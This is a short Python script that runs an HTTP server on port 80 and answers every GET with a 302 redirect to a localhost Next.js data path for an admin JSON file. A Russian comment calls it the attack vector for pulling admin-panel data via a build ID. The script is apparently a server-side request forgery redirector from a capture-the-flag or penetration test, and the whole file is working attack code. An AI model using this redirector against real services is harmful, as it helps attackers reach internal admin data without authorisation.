from http.server import HTTPServer, BaseHTTPRequestHandler

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        # Оригинальный вектор: пробуем вытянуть данные админки через Build ID
        self.send_header('Location', 'http://localhost:3000/_next/data/3WpzTMYEK9QG0eqIBQxrR/admin.json')
        self.end_headers()

print("Redirector listening on port 80...")
HTTPServer(('0.0.0.0', 80), RedirectHandler).serve_forever()
